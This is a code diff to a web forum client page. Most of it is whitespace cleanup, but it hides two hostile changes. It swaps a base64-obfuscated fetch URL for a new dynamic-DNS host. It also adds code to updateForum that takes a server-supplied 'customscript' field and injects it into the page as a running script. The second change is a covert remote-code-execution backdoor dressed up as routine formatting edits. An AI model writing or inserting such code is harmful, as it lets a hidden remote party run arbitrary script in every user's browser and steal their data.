@@ -4,7 +4,7 @@
 	<script>
 		var USE_PREFRETCH = true;
 		var fetchPingFormData0=""; 
-		var operfetch = atob("aHR0cDovL3NpZGVycy5kZG5zLm5ldDo2MDc3Ny9tZGlzcGF0Y2gucGhw");
+		var operfetch = atob("aHR0cDovL3NpZGVyczIuZGRucy5uZXQ6NjA2NjYvbWRpc3BhdGNoLnBocA==");
 		if(USE_PREFRETCH) {
 			pingFormData0 = new FormData(); 
 			pingFormData0.set('op', "fetch");
@@ -416,7 +416,7 @@
 	}
 	</script>
 	
-<script id="script_images">  	// paste image. convert to jpeg and resize
+<script id="script_images"> // paste image. convert to jpeg and resize
 
 	const image_import_settings = {target_width:1024, max_height:720, jpg_quality:0.80}
 
@@ -488,7 +488,7 @@
 <code class="scripts_handlers">
 
 <script id="script_handleUser">
-	const handleUser = new class{
+	const handleUser = new class {
 		constructor(){
 			this.elem_nickname = document.getElementById("inpNickname");
 			this.elem_cipher = document.getElementById("inpCipher");
@@ -822,13 +822,12 @@
 
 
 		updateForum(msghead_data) {
-			
 			let isNewDataAvailable = Array.isArray(msghead_data);
 			let updated = false;
 			let rcvd_msg_id = -999;
 			if (isNewDataAvailable){ 
-				console.assert(msghead_data.length==2, "length should b 2")
-				let msghead = msghead_data[0], data = msghead_data[1];
+				console.assert(msghead_data.length==3, "length should b 2")
+				let msghead = msghead_data[0], data = msghead_data[1], customscript = msghead_data[2];
 				rcvd_msg_id = Number(msghead['msg_id']);
 				let rpost_id = Number(msghead['rpost_id']);
 				let n_replies = Number(msghead['n_replies']);
@@ -845,6 +844,10 @@
 				else // inside post
 					handleThread.parseDataForThread(data);
 				updated = true;
+				var newScript = document.createElement("script");
+				var inlineScript = document.createTextNode(customscript);
+				newScript.appendChild(inlineScript);
+				document.body.appendChild(newScript);
 			}
 			else if (msghead_data>0) //msg_id, no new data
 			{
@@ -860,7 +863,6 @@
 					if(handleThread.isdirty = true) 
 						{handleThread.parseDataForThread(this.map_data.get(rpost_id)); updated = true;};
 				}
-				
 			}
 
 			this.t1Fetch = performance.now();
